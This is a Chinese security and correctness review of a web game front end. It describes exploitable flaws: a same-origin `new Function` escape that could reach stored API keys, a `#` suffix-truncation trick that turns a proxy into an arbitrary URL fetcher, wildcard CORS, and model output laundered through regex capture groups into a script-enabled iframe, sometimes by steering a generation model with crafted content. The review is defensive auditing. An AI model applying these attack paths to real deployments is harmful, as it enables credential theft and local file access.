# 仓库审查：IndependentFront for Destined Journey（2026-08-09）

**仓库：** `The-poem-of-destiny/IndependentFront-for-destined-journey`
**审查日期：** 2026-08-09
**基线：** `e04c83b`（本地 `master`）+ 未提交工作树。本地落后 `origin/master` 两个提交（#74、#75），本报告**不覆盖**那两个提交。
**审查类型：** 全仓静态审查 —— 架构 / 安全 / 正确性 / 性能 / 测试 / 工程治理
**审查方式：** 13 个分区审查 Agent 并行铺开（约 25 万行），再对其中 34 条最高严重度结论派 35 个对抗性复核 Agent 逐条**证伪**；四条最关键的由主会话亲自复算。

> **与 [`2026-08-01-repository-review.md`](2026-08-01-repository-review.md) 的关系**：那份仍是有效基线。本份**不重写**它的任何结论。上一份登记的 SEC-02 / SEC-03 / SEC-04 / SEC-05 / PERF-01 在本次复核中**确认仍然存在**，本文用「复发确认」标注并只补充新增事实（尤其是 SEC-02 的前提已经变化）；新发现另起编号。

---

## 概要

工程治理层面这个仓库是**少见的自律**：八道 CI 闸门拆三个并行 job、死代码棘轮按问题身份而非计数比对、编码不变量测试带反假绿哨兵、`.gitattributes` 同时照顾 `.bat` 的 CRLF 与 shebang 的 LF。复核 Agent 反复试图在这些地方找漏，找不到。全仓危险模式扫描也干净：两处 `@ts-expect-error`（同一个测试文件，均有理由）、五处 `eslint-disable`（均有就地说明）、零个空 catch、无 `innerHTML`、`localStorage` 除刻意保留的沙箱镜像与迁移模块外无残留。

问题不在治理，在**两个地方的边界判定**，以及**一处接线顺序**。

第一，也是唯一的**阻断级**问题：**v3 战斗在第一个玩家回合永久死锁**。玩家指令句柄在 `await runCombatV3(...)` **之后**才挂到 store，而内核在玩家回合会无超时地 `await waitForCommand()` —— 能解开它的句柄要等这场战斗结束才注册。提交按钮是静默 no-op，放弃按钮同样够不到内核，于是整个回合的 `finally` 永不执行。`combatEngineVersion ?? 'v3'` 是默认值且 v2 已在 M5 删除，所以这是**唯一的战斗路径**。

第二，**信任档的判定依据用错了对象**。美化管线用「谁写的**模板**」决定 iframe 信任档，而不是「谁的**字节**在输出里」。捕获组展开不转义，于是模型正文经由一条**默认启用**的内置规则，就能落进本该只给用户自装规则的脚本放行档。这是 SEC-01 当年那套两档设计的**绕过**，不是它的复发。

第三，**BFF 的通配 CORS 与 SSRF 白名单互相拆台**（SEC-04 复发）。`proxy.ts` 放行 loopback/内网的理由白纸黑字写着「这是同源 BFF」，而 `app.ts` 的 `origin: '*'` 恰恰让这句话不成立。

正确性缺陷则高度**同形**：六条独立发现最后都收敛成同一个模式 —— **拿一份快照做读-改-写，而这份快照的另一个写者正在并发改它**。

> 📌 **初稿之后补正过两次前提**（详见下方「[威胁模型](#威胁模型2026-08-09-补正)」）：①内容包由单一可信团队撰写，分离动机是**内容敏感**；②工坊 / EJS / 正则的暴露面**有意开放**，判据是三条红线 —— 访问应用外文件 / 危害宿主 / 窃取 API Key，此外的破坏（搞坏存档、卡死标签页、外传自己那次命中）**一律容忍**。
>
> 按这条判据重排之后，安全部分的结论**大幅换位**，不是简单下调：
>
> - **SEC-02 升到最高** —— `new Function` 跑在应用同源主线程上，逃逸后够得到 Dexie，而 API Key 已经搬进 Dexie。**越红线 ③**。它恰好经由「有意开放」的工坊面触发。
> - **新增 SEC-09** —— `X-Target-Base-URL` 末尾一个 `#` 就能吃掉 `forward()` 的固定 suffix（实测），把 BFF 变成任意 URL 取回器。它把 SEC-03 + SEC-04 从「内网扫描」拉成**任意本地文件读取**，**越红线 ①**。
> - **SEC-06 降到容忍范围内** —— 洗进去的字节拿到的，恰好就是用户自装规则**本来就被授予**的那份能力，且全程关在不透明 iframe 里，够不到文件、宿主、Dexie 与 Key。两档之分因此变得基本装饰性，这件事本身值得知道，但按裁定不必修。
> - PERF-01 同理降到容忍范围内（卡死标签页属于明确容忍项）。

### 总体判断

**工程底盘扎实，测试文化真实有效；但当前工作树上「战斗打不完」，且信任边界有一处新的绕过。**

建议的修复闸门：

1. 先修 BLK-01（一行的顺序调整），它同时解封四条被遮蔽的战斗缺陷。
2. 再修 SEC-06 的信任档判定 —— 这是当前唯一能让模型正文拿到脚本面与网络出口的路径。
3. 然后收敛「快照读-改-写」这一族（COR-01 / COR-02 / COR-07 为首）。
4. 给 CI 补 `npm run build` 闸门（TEST-01）。

---

## 范围与方法

覆盖：`src/sillytavern/**`（引擎 301 文件）、`src/ui/**`（前端 336 文件）、`server/**`、`tests/**`、`scripts/`、根配置、CI 工作流、以及 `AGENTS.md` 与分册。

流程：

1. **分区铺开** —— 13 个 Agent，各带一条明确的镜头（写入路径 / Agent 编排 / 战斗 v3 / 效果事件 / EJS 沙箱 / 美化沙箱 / 两组 Pinia store / 桥接层 / 服务端 / Vue 组件 / 测试质量 / 横切治理）。每人最多 5 条，要求可锚定到行、可给出具体失败场景，明确禁止风格类意见。产出 **50 条**。
2. **对抗性复核** —— 对其中 34 条（全部 critical/high + 影响面较大的 medium）各派一名复核 Agent，指令是**先假定结论错误**、去找提出者漏看的守卫/调用方/测试/文档决策，不确定时默认判「证伪」。最严重的那条额外派了第二名、换角度的复核者。
3. **主会话亲验** —— BLK-01、SEC-06、SEC-04、COR-03 由主会话独立复算，SEC-06 用一次性探针测试**实测**而非推理。

复核结果：**13 条原样成立**，**21 条成立但机理或严重度被修正**（多为下调并附上可达性限制），**0 条被完全推翻**。零推翻不代表复核放水 —— 修正工作主要体现在严重度下调与可达性收窄上（例如四条战斗缺陷被指出「在 BLK-01 之前根本跑不到」）。

### 局限

- **未做真机走查。** 全部结论来自代码阅读、静态推理与单元级探针。UI 交互、真实 LLM 往返、浏览器渲染行为均未在真机验证。
- **未验证的 16 条**（见文末登记表）只经过一名 Agent，未经对抗性复核，可信度低于正文各条。
- **工作树在审查期间被另一个会话并发修改**（19:25–19:31，forest 主题相关的 `DESIGN.md` / `docs/planning/2026-08-08-selected-theme-directions.md` / `forest.css` / `integrated-game-surfaces.css` / `tests/theme-surface-ownership.test.ts`）。本次审查未触碰这些文件。19:20 跑测试时 `theme-surface-ownership.test.ts` 有 1 条红，19:31 被那个会话改好，现已全绿 —— 报告中的闸门数据按最终状态记录。
- 复核 Agent 在验证过程中留下过两个探针测试文件，已删除。

---

## 威胁模型（2026-08-09 补正）

> 🔴 **本节是初稿之后由维护者补正的前提，正文各条的严重度已据此重算。** 初稿默认「内容包是第三方输入」，这个默认是错的。

**内容包不是攻击面。** 运行在引擎上的内容由**单一可信团队**撰写；内容-引擎分离的动机是**内容敏感**（IP / 授权素材不进公开仓），**不是**隔离不可信输入。因此：世界书条目、预设、`agent-config.json`、内容包里的 EJS 与脚本，都按**可信作者**对待 —— 它们仍可能**写错**，但不会**蓄意为恶**。

**仍然开着的不可信通道**（与内容包无关，逐条核实过）：

| 通道                         | 状态                                                                                                                                                                                                                |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 创意工坊                     | **开着** —— `HomePage.vue:26` 的 `WORKSHOP_ENTRY_ENABLED = true`；工坊正则经 `mapWorkshopRegexes` → `workshop-install-plan` 真的进入美化规则库（`useBeautify.getBeautifierRules`）。公共快照 303 项目 / 99 条正则。 |
| 导入的角色卡 / 世界书 / 备份 | **开着** —— `HomePage.vue`、`DataSection.vue`、`content-store.ts` 均有导入入口。                                                                                                                                    |
| 模型输出本身                 | **永远不可信** —— 与内容是否可信无关：LLM 会自发产出意外字节，无需任何对手。                                                                                                                                        |
| 用户浏览的任意网页           | **与内容无关** —— BFF / dev server 类问题（SEC-03/04/05）的对手是浏览器里的另一个页面。                                                                                                                             |

### 安全底线（维护者裁定，2026-08-09）

工坊 / EJS / 正则的暴露面是**有意开放**的，为的是最大兼容性与功能性。判据不是「暴露面有多大」，而是**有没有越过下面三条线**：

| #   | 红线                                               | 越线即必须修 |
| --- | -------------------------------------------------- | ------------ |
| ①   | 访问应用之外的文件                                 | 是           |
| ②   | 执行危害宿主的代码（病毒 / 木马 / 逃出浏览器沙箱） | 是           |
| ③   | 窃取 API Key —— 判据是**能不能把它传出去**         | 是           |

**明确容忍**（不算缺陷，为兼容性买单）：搞坏存档、污染变量、把界面画成什么样、规则外传自己那次命中的文本、装的规则把标签页卡死 —— 只要没越上面三条线。

**两条口径细化（2026-08-09 维护者补充）：**

1. **红线 ③ 的判据是「能上传」，不是「能读到」。** 于是它拆成两个必要条件：**同源代码执行**（读得到 Dexie）**且能出网**。核查结论：`index.html` / `vite.config.ts` / `server/app.ts` **都没有设 CSP**，应用页面的 `fetch` 出网完全不受限 —— 第二个条件**恒真**。红线 ③ 因此完全退化成「有没有同源代码执行」，见下面那张清单。反过来说，这也给出一条便宜的纵深防御：给应用文档加 `connect-src` CSP，能单独打断「上传」这条腿（所有模型流量本来就走同源 BFF，`'self'` + 工坊 worker 那个源大概率就够 —— 需实测确认）。
2. **正式发行不会让用户跑 `npm run dev`。** 只存在于 Vite `configureServer` 里的东西因此**退出用户威胁模型**：SEC-03（`/data` 绝对路径逃逸）与 SEC-05（无校验写入口）都只在 dev 注册，发行后的用户碰不到。两条降级为**维护者工作站卫生问题** —— 那台机器上恰好放着私有内容仓，仍值得修，但不是发行阻塞项。
   ⚠️ 但 `server/**` **不是** dev-only：`server/app.ts:16` 自陈「dev（vite middleware）与**未来** prod（独立 server）共享同一份路由代码」，`configurePreviewServer` 挂的也是同一套。所以 **SEC-04 / SEC-09 是否随发行出去，取决于发行形态**（见那两条的「发行形态依赖」段）。仓库现状：没有桌面壳（无 electron / tauri），也没有独立 server 入口 —— 与上一份 review 的 REL-01 一致。

### 同源代码执行清单（红线 ③ 的完整入口，逐条核过）

既然「能出网」恒真，红线 ③ 就等价于这张表。全仓的 `new Function` / `eval` / `v-html` 都在这里：

| 入口                                              | 生产可达？                                                                                                                                                        | 越红线 ③？      |
| ------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------- |
| `script-executor.ts:174` `new Function`（SEC-02） | **是** —— 每次读档、每次装/卸物品、每次状态到期                                                                                                                   | 🔴 **是**       |
| `ejs-backend.ts` `LegacyBackend` `new Function`   | **否** —— `main.ts:100` 调 `installProductionEjsBackend()` 切到 QuickJS；装载期与失败时都 **fail-closed**，刻意不回落 Legacy（`ejs-backend.ts:250` 就地写明理由） | 否              |
| `effect-runtime.ts:309` `new Function`            | **否** —— `EffectRuntime` 生产无任何实例（只有自身测试引用）                                                                                                      | 否（见 COR-30） |
| `ChatFlow.vue:330` `v-html`                       | 是，但入参是 `escapeHtml(msg.content)`                                                                                                                            | 否              |
| 美化 `scripts:'allow'` iframe                     | 是，但不透明源 —— 够不到应用 Dexie                                                                                                                                | 否              |
| 世界书 EJS                                        | 是，跑在 QuickJS 隔离里                                                                                                                                           | 否              |

**结论：`script-executor.ts` 是当前唯一一条活的同源代码执行路径，因而也是唯一一条活的 API Key 上传路径。** 修复面因此很小且明确 —— 这是本次重排最有价值的结论。

按这条判据把本报告的安全类发现重新分组（判定依据见各条正文，决定性的技术事实由主会话当场实测）：

| 结论                  | 条目                               | 为什么                                                                                                                                                                                                                                                                                                                                         |
| --------------------- | ---------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 🔴 **越线 ③**         | **SEC-02**                         | `new Function` 跑在**应用同源主线程**（非 Worker / 非 iframe），构造器逃逸拿到应用 `globalThis` → `indexedDB` → Dexie。而 `api-key-migration.ts` 已把 Key **搬进 Dexie**。工坊世界书可引导 item_gen 产出恶意 `scripts.init`，`wireEffectSystem` 每次读档都会跑它。                                                                             |
| 🟠 **取决于发行形态** | **SEC-09 + SEC-04**                | `X-Target-Base-URL` 末尾一个 `#` 就能把 `forward()` 拼接的固定 suffix 吃进 fragment（实测），BFF 沦为任意 URL 取回器；通配 CORS 让响应对攻击者页面可读。**若发行版带本地 BFF 就随之出去**，届时任何网页都能驱动它读本机与内网的 HTTP 服务（含 ComfyUI `/view` 这类直接对外供文件的本地服务）。不窃 Key —— BFF 无状态，攻击者只能用自己的凭据。 |
| 🟡 **维护者工作站**   | **SEC-03 + SEC-05**                | 只在 Vite `configureServer` 注册，发行版用户碰不到。但在开发机上，它们与上一行串成「任何网页读走/覆盖任意本地文件（含私有内容仓）」的完整链。**退出用户威胁模型，留在维护者卫生清单。**                                                                                                                                                        |
| ⏸️ **无限期搁置**     | SEC-06 / PERF-01 / SEC-07 / SEC-08 | 全部被不透明 iframe 或「只搞坏自己」限住：够不到应用之外的文件、够不到宿主、够不到 Dexie 与 API Key。见各条的「政策判定」段。                                                                                                                                                                                                                  |

**敏感性引入的新审查轴：内容会不会被带出去。** 初稿没有看这一轴。补查结论：

- ✅ **构建产物不含真实内容。** `public/data/` 是显式标注的**占位集**（`agent-config.json` 首行 `$comment` 写明「占位内容（内容-引擎分离 §6 / D27 / D32 / D44）」），真实内容只经 `POEM_CONTENT_DIR` 的 **dev overlay** 进入，而 overlay 只注册在 `configureServer` 里。`vite build` 产出的 `dist-ui/data/` 是占位集。分发构建产物**不会**分发内容。
- ⚠️ 与此相对，上一份 review 的 REL-01（生产构建不是完整可运行产物）在这个动机下**部分是刻意的** —— 内容本来就不该进出货物。若将来要做独立生产服务器，需要为「内容从哪来」单独设计，而不是把 overlay 直接搬过去。
- ⚠️ **SEC-06 在这一轴上变重而不是变轻**：`scripts: 'allow'` 档的 CSP 是 `connect-src http: https: ws: wss: data: blob:`，且该 frame 拿得到本次命中的正文（`source` / `captures`）。那就是一个把**敏感叙事内容**送出去的出口。根 `AGENTS.md` 已把「规则可外传该命中的 replacement/capture」列为**明确接受**的暴露 —— 那条接受是在「规则由用户自己安装」的前提下做的，在「内容敏感」的前提下值得重新过一遍。

---

## 闸门实测

| 闸门                             | 结果                                    |
| -------------------------------- | --------------------------------------- |
| `npm run typecheck`              | ✅ 通过                                 |
| `npm run typecheck:vue`          | ✅ 通过                                 |
| `npm run lint`（0 warning）      | ✅ 通过                                 |
| `npm run knip:ratchet`           | ✅ 通过 —— 基线 145 条，其中 3 条可收紧 |
| `npm run test:run`               | ✅ 7347 通过 / 9 skipped（286 文件）    |
| `npx vite build`                 | ✅ 21.6s —— GamePage chunk 624 kB       |
| `npm audit`                      | ✅ 0 漏洞                               |
| CI（`.github/workflows/ci.yml`） | 三个并行 job、八道闸门，**不含 build**  |

> 📌 **GitHub 安全页那 6 条 Dependabot 告警是过期的，别去追。** push 时 GitHub 会提示「6 vulnerabilities (2 high, 4 moderate)」，与上表的 `npm audit: 0` 直接矛盾。逐条核过：5 条 undici 的受影响范围是 `>= 7.0.0, < 7.29.0`、首个修复版 `7.29.0`，而锁定安装的正是 **7.29.0**；1 条 postcss 受影响 `<= 8.5.17`、首个修复版 `8.5.18`，实装 **8.5.25**。六条全部已在修复版之上，告警建于 2026-08-02 / 08-04 且未被自动关闭。`npm audit` 的 0 是对的。

补充观测：`build.sourcemap: true`，产物里带 59 份 sourcemap 共约 9.7 MB。对本地优先的应用不算缺陷，但等于把可读源码一起发出去，值得有意识地确认一次。依赖零漏洞，但 pinia 2→4、vite 6→8、typescript 5→7 有大版本落差。

---

## 修复状态（2026-08-10 更新）

> 本节只记「本报告登记的条目现在是什么状态」，各条的分析原文一字未改。

**已收口**

| ID      | 收口方式                                                                                                                   |
| ------- | -------------------------------------------------------------------------------------------------------------------------- |
| SEC-02  | `executeScript` 迁进 QuickJS realm，`new Function` 那条路径已删、fail-closed（见该条正文的 ✅ 块）                         |
| BLK-01  | `setCombatCoordinator` 已移到 `await runCombatV3(...)` **之前**（`game-pipeline.ts`），死锁解除                            |
| SEC-09  | `forward()` 先 `new URL` 规范化掉 base 的 query/fragment 再拼 suffix；解析不了的 base 400。5 条回归在 `server-app.test.ts` |
| SEC-03  | `/data` 读路径套上写路径那道 `relative()` 包含校验，删掉已成死代码的 `'..'` 判断                                           |
| COR-02  | `GamePage.onUnmounted` 先 `pipeline?.abort()`；管线内新增存档归属闸（`emitMessage` / `refreshFromDb`）                     |
| COR-07  | `installPack` 的互斥改为第一个 await 之前**同步**置位 + 外层 finally 放锁；`uninstallPack` 补读锁（新增 `busy` 状态）      |
| COR-08  | `stats` 改为**每条目**从宿主 JSON 重建；`ejs-backend-parity.test.ts` 补两条跨条目用例                                      |
| COR-12  | 续骰 / rejection 恢复改用内核当前行动单位（`currentInitiative`），不再是 `initiativeOrder[0]`                              |
| COR-13  | `applyBuffTick` 跳过「召唤时限」，到期所有权独占归 `expireSummonedUnits`                                                   |
| TEST-01 | CI 的 types job 末尾补 `npm run build`（八道闸门 → 九道）                                                                  |

每条都配了**先证伪再修**的回归测试：临时撤掉修复后逐条确认变红。

> 🔴 **修复本身又过了一轮对抗审查（2026-08-10），逮到 5 处并已一并收口** —— 记在这里是因为
> 其中两条正是「修一半比不修更糟」的形状：
>
> 1. **COR-12 的初版在最常发生的那条续骰路径上是净退步。** `initiative` 通道只有 10 颗骰，
>    4 个单位打到第 3 轮必然耗尽；而 `initiative.ts` 骰子耗尽时 `return out` **早于**
>    `currentTurnIndex = 0`，`unit-turn` 收尾最后一位时又不写该字段，`reduceSupplyDice` 零推进
>    —— 于是那条路上拿到的是**上一轮先攻末位**，比旧代码的「上一轮首位」更不可能对。
>    现在按 phase 分流：只有回合中（`UnitTurnOpen`/`SlotConsume`/`MoraleCheck`/`UnitTurnClose`）
>    才信 `currentTurnIndex`，其余一律退回 `initiativeOrder[0]`。初版注释里那句「Initiative
>    阶段恢复不受影响」是**假的**（归零发生在下一次 dispatch 里面，而取值在那之前）。
> 2. **COR-02 的闸门漏了 `addSystemMessage`。** 它与 `addMessage` 落到同一个 `persistMessage`
>    （`saveId: activeSaveId.value`），所以 char_gen 的 NPC 卡片照样能写进后来打开的存档；
>    同一段的 `characters.push` 也一样。已补 `emitSystemMessage` 同闸 + 整块守卫。
> 3. **`sendOpeningPrompt` 收尾会写到别的存档上** —— 它读 `this.game.messages`、经
>    `releaseOpeningPromptClaim` → `patchSaveMetadata` 写 `activeSave`。两个都刚开场的存档交错时，
>    A 会把 **B 的** `openingPromptConsumed` 归还成 false，B 下次挂载把开场叙事写两遍。
> 4. **`setPendingOptions` 写在闸门之前** —— 孤儿回合的行动选项照样铺进新存档的输入区。
> 5. **COR-08 的初版实现选了最贵的那种**：每条目求值一遍 `stats` 的**源码字面量**（词法+语法+
>    字节码），实测 109 条目 / 57KB stats 是 626ms，而 `JSON.parse` 同语义只要 191ms —— pass
>    天花板是 5000ms，撞上去的后果是剩余条目**静默回退原文**。且那句 `evalVoid` 的返回值**没查**，
>    重建失败会让本条目读到上一条的残留。现在从 guest 侧一个不可写不可配置的母本 `JSON.parse`，
>    并用 `defineProperty` 让失败变响（顺带堵掉「条目把 `stats` 钉成不可配置」那条复活路径）。
>
> **仍未做、需要裁定的一条**：侧链（char_gen / item_gen / craft_gen）**不响应 abort**
> —— `getClientFactory` 包出来的客户端只转发入参 `signal`，而 `run()` 的 `abortController`
> 只交给了 story。接上它会顺带改变「停止生成」按钮的语义（当前是让侧链跑完），属于产品决定，
> 故只登记不动手。数据安全那一半已由上面第 2 条的闸门兜住。

**仍未处理**（各自的理由见正文）

- **SEC-04** —— 需要先裁定发行形态（带不带本地 BFF），不是代码问题。
- **SEC-05** —— 写入口的来源校验会改变 dev 工具的可达性，留给维护者决定口径。
- **COR-01 / COR-03 / COR-04 / COR-05 / COR-06** —— 都要改数据模型或补新的写入路径（字段级补丁 / 分钟制记账 / `status-api` 接线 / `detachItemWiring` / 标记落库），不属于「照着结论改一处」那一类。
- **PERF-02** —— 要动 BeautifierFrame 的 postMessage 桥，回归面比看上去大。
- **SEC-06 / PERF-01 / SEC-07 / SEC-08** —— 维护者已裁定**无限期搁置**，不修。
- 文末「登记但未展开」那 24 条 —— 报告本身建议先各自复核再动手。

---

## 优先级总表

「置信度」列：**已确认** = 对抗复核后原样成立；**已修正** = 成立但机理/严重度经复核修正；**未复核** = 仅单 Agent 提出。
严重度已按「安全底线」三条红线重排：**越线**是最高档，位于「阻断」之上；明确容忍的暴露面统一标 **容忍**（仅登记、不建议修）。

| ID         | 严重度       | 区域            | 一句话                                                                    | 置信度     |
| ---------- | ------------ | --------------- | ------------------------------------------------------------------------- | ---------- |
| SEC-02     | **越线 ③**   | 脚本执行        | `new Function` 在应用同源主线程跑 AI 脚本，逃逸后可读 Dexie 里的 API Key  | 主会话亲验 |
| SEC-09     | **发行相关** | BFF             | `X-Target-Base-URL` 末尾一个 `#` 吃掉固定 suffix，BFF 沦为任意 URL 取回器 | 主会话实测 |
| SEC-03     | 维护者机器   | 开发服务器      | `/data` 绝对路径逃逸（仅 dev，发行版用户碰不到；开发机上仍是任意文件读）  | 已修正     |
| SEC-04     | **发行相关** | BFF             | 通配 CORS 让 BFF 响应可被任意网页读到（2026-08-01 登记）                  | 已确认     |
| SEC-05     | 维护者机器   | 开发服务器      | 无来源校验的写入口，盲写覆盖私有内容仓（仅 dev）                          | 已修正     |
| BLK-01     | **阻断**     | 战斗 / 桥接     | v3 战斗在第一个玩家回合死锁，提交与放弃双双静默失效                       | 主会话亲验 |
| COR-02     | **高**       | 桥接 / 生命周期 | 离开游戏页不 abort pipeline，孤儿回合把正文写进后来打开的那个存档         | 已确认     |
| SEC-06     | 无限期搁置   | 美化沙箱        | 捕获组把模型字节洗进脚本放行档 —— 关在不透明 iframe 内，未越任何红线      | 主会话实测 |
| COR-01     | 中           | 持久化          | UI 整份写回内存 SaveProfile，回合中途操作会抹掉引擎当回合的全部提交       | 已修正     |
| COR-03     | 中           | 状态效果        | `timeUnit: '小时'` 的效果在 60 分钟以下的推进里永远不衰减                 | 已修正     |
| COR-04     | 中           | 效果系统        | `$status.apply` / `$status.remove` 意图被收集后无人消费                   | 已确认     |
| COR-05     | 中           | 效果系统        | 效果接线只在显式 unequip 拆除，同槽顶替与 remove_item 留下活订阅          | 已修正     |
| COR-06     | 中           | 地图            | 地图标记从不落库，关掉地图弹窗即全部丢失                                  | 已确认     |
| COR-07     | 中           | 内容包          | `execBusy` 互斥设得太晚且 uninstall 不检查，回滚可反噬另一次操作          | 已确认     |
| COR-08     | 中           | EJS             | QuickJS 每趟只编组一次 `stats`，一个条目的改动泄漏给后续条目              | 已确认     |
| COR-12     | 中           | 战斗 v3         | 续骰后 coordinator 指向 `initiativeOrder[0]` 而非当前回合单位             | 已修正     |
| COR-13     | 中           | 战斗 v3         | 「召唤时限」每轮被 tick 两次且在 round.open 到期，偶数时长的召唤不消失    | 已修正     |
| PERF-01    | 无限期搁置   | 美化            | 灾难性回溯卡死标签页 —— 属明确容忍项（2026-08-01 登记）                   | 已修正     |
| PERF-02    | 中           | 美化渲染        | 每回合首尾把聊天记录里所有美化 iframe 各重载一遍（共两波）                | 已确认     |
| TEST-01    | 中           | CI              | CI 从不跑 `npm run build`，构建性破坏可以全绿合入                         | 未复核     |
| TEST-03    | 中           | 测试            | `MiniPlayer.test.ts` 泄漏 12 个 wrapper 中的 11 个，冲音频单例            | 未复核     |
| TEST-04    | 中           | 测试            | 「同批提交」断言跨 commit 调用扁平化，检测不出拆批                        | 未复核     |
| COR-21     | 中           | 捏人页          | `applyPresetData` 是部分还原：丢工坊轴、残留上一次的选择                  | 未复核     |
| COR-22     | 中           | 设置            | 工坊装卸把各 agent 默认 worldBookIds 复制进覆盖层，永久冻结               | 未复核     |
| SEC-07     | 无限期搁置   | BFF             | SSRF 黑名单可被一次 302 绕过（名单本就只有 4 项，且 SEC-09 更直接）       | 已修正     |
| SEC-08     | 无限期搁置   | EJS             | 客体可设宿主草稿原型 —— 只污染本趟、不落库，未越红线                      | 未复核     |
| COR-09     | 低           | EJS             | 草稿里出现不可 stringify 的值 → 整趟 vars 写入静默丢弃且仍报 ok           | 已修正     |
| COR-10     | 低           | 战斗 v3         | DeclareBlock 恢复丢弃冻结帧的 pendingChanges（攻击槽不消耗）              | 已修正     |
| COR-11     | 低           | 战斗 v3         | 自动机 `charges` 从不递减                                                 | 已修正     |
| COR-14     | 低           | 战斗 v3         | 冻结前消耗的骰子被回滚，下一次攻击重掷同样的点数                          | 已确认     |
| COR-15     | 低           | 编排            | 阶段 `<json>` 用裸 `JSON.parse`，绕开仓库声明的唯一 JSON 抢救入口         | 已修正     |
| COR-16     | 低           | 预设            | 宏白名单漏了三个已注册占位符，会被静默删除                                | 已修正     |
| COR-17     | 低           | 流式            | `chatStream` 首字节后永久解除超时，中途卡死无引擎侧恢复                   | 已修正     |
| COR-18     | 低           | 存档元数据      | `patchSaveMetadata` 从内存快照整行写回                                    | 已修正     |
| COR-19     | 低           | 订阅            | 嵌套 `$event.on` 注册进 `unregisterAll` 够不到的桶                        | 已修正     |
| COR-20     | 低           | 工坊社交        | 登出后落地的 toggle 会把覆盖层写回来                                      | 已修正     |
| COR-24     | 低           | 美化            | storage session 在 mount 时定档，不随 `props.scripts` 变化                | 已修正     |
| COR-25     | 低           | 游戏页          | 异步 `onMounted` 无存活检查，可在卸载后发出开场提示词                     | 已修正     |
| COR-27     | 低           | 持久化          | `commitChatState` 非事务，但文件头注释仍宣称「全部成功或全部回滚」        | 已修正     |
| COR-28     | 低           | EJS             | `ui.notify` 预算命名/注释说 per-pass，实际是 per-entry，且无 pass 级上限  | 已修正     |
| 其余 12 条 | 低           | 各处            | 见文末「登记但未展开」                                                    | 未复核     |

---

# 详细发现

## BLK-01 —— v3 战斗在第一个玩家回合永久死锁

**严重度：阻断** · **区域：`src/ui/lib/game-pipeline.ts` / `src/ui/stores/game-store.ts` / `src/sillytavern/combat-v3/coordinator.ts`** · **主会话亲验**

### 证据

[`game-pipeline.ts:1558`](../../src/ui/lib/game-pipeline.ts) 先 `await` 整场战斗，再注册指令句柄：

```ts
let pendingResolve: ((c: CombatCommand) => void) | null = null;
const waitForCommand = () => new Promise<CombatCommand>((resolve) => (pendingResolve = resolve));

const result = await runCombatV3({ /* … deps.waitForCommand … */ });   // :1558 —— 在这里等

// 暴露 coordinator 句柄给 store（前端提交/放弃）
this.game.setCombatCoordinator({ submit: …, abandon: … });             // :1582 —— 战斗结束后才挂
```

而内核在玩家回合会**无超时**地等这个 Promise —— [`coordinator.ts:295`](../../src/sillytavern/combat-v3/coordinator.ts) 与 [`:334`](../../src/sillytavern/combat-v3/coordinator.ts)：

```ts
return freshRevision(deps.waitForCommand(), session);
```

`freshRevision` 只是 `const cmd = await p`（`coordinator.ts:306-312`），没有 race、没有 timeout、没有 abort 通道。

`setCombatCoordinator` 全仓**只有这一个调用点**（另两处命中是 store 的定义与导出）。因此：内核等句柄解开，句柄等内核结束 —— 循环等待。

两条本该兜底的路都是静默的：

- `submitCombatCommand`（[`game-store.ts:222`](../../src/ui/stores/game-store.ts)）第一行是 `if (!coordinator?.submit) return;` —— 玩家点行动按钮，**什么都不发生，也没有任何报错**。
- `abandonCombat`（[`game-store.ts:236-243`](../../src/ui/stores/game-store.ts)）把 `v3ActiveCombat` 清成 `null`、UI 看着像退出了战斗，但 `c?.abandon` 是 undefined，内核 Promise 依然挂着，pipeline 的 `finally` 永不执行 —— `refreshFromDb` 不跑、agent 状态不清、输入不解锁。

store 里那行注释（`game-store.ts:214`）写的是「game-pipeline 在 coordinator **启动时**挂」。代码是在**结束后**挂。注释描述的是本意，实现做了相反的事。

### 可达性

`handleCombatTrigger`（`game-pipeline.ts:1494`）取 `combatEngineVersion ?? 'v3'`，**v3 是默认值**，且 v2 运行时已在 M5 真正删除（打回 `'v2'` 只会得到一句退役提示）。参与者里必然有玩家（`playerC` 为空直接返回），所以玩家回合必然发生。**每一场战斗都会卡住。**

### 为什么测试没抓到

[`game-store.test.ts:493`](../../src/ui/stores/game-store.test.ts) 与 `:518` 是**手动**调用 `setCombatCoordinator({...})` 之后再断言 submit / abandon 生效。它证明的是「给了句柄时 store 行为正确」，而不是「生产会在需要之前给出句柄」。`handleCombatTriggerV3` 本身没有任何测试。这正是「测试把被测对象本身 mock 掉」的典型形状。

### 建议

把 `this.game.setCombatCoordinator({...})` 移到 `await runCombatV3(...)` **之前**（`pendingResolve` 与 `waitForCommand` 的闭包已经在上面定义好了，直接前移句柄注册即可），并在 `finally` 里 `setCombatCoordinator(null)` 清理，避免上一场的陈旧句柄留到下一场。

### 验收标准

- 新增一个 pipeline 级测试：mock 的 `runCombatV3` 在 resolve **之前**调用 `deps.waitForCommand()`，断言此时 `game-store` 上的 coordinator 句柄已存在且 `submit` 能解开那个 Promise。
- `submitCombatCommand` 在没有句柄时不再静默返回，而是 warn（或返回一个可判定的失败），使同类回归可见。
- 真机走查一场完整战斗直到结算。

---

## SEC-06 —— 捕获组展开把模型字节洗进脚本放行的 iframe 信任档（新增）

**严重度：高**（复核者判中，理由见下）· **区域：`src/sillytavern/beautifier.ts` / `src/ui/components/game/BeautifiedNarrative.vue`** · **主会话实测**

### 证据

美化管线有意做了两档信任（`beautifier-frame.ts:159-167` 的注释写得很清楚）：`scripts: 'allow'` 给用户自装规则，脚本、内联事件、远程资源、网络 API 全开；`scripts: 'block'` 给模型产的卡片，`script-src 'nonce-…'`、`script-src-attr 'none'`、`connect-src 'none'`，且不注入共享 `regexStorage` 快照。

档位判定只看一个字段（[`BeautifiedNarrative.vue:176`](../../src/ui/components/game/BeautifiedNarrative.vue)）：

```ts
return segment.origin === 'model' ? 'block' : 'allow';
```

而 `origin` 记录的是**谁写了模板**，不是**谁的字节在输出里**。`applyRule`（[`beautifier.ts:585`](../../src/sillytavern/beautifier.ts)）给命中段盖 `origin: 'rule'`，其 `replacement` 由 `expandReplacement`（[`beautifier.ts:371-396`](../../src/sillytavern/beautifier.ts)）生成 —— 它把 `$1`…`$99`、`$&`、`` $` ``、`$'`、`$<name>` **原样**拼进模板，全程不转义。

于是：模型正文 → 捕获组 → 规则模板 → `origin: 'rule'` → 脚本放行档。

### 实测

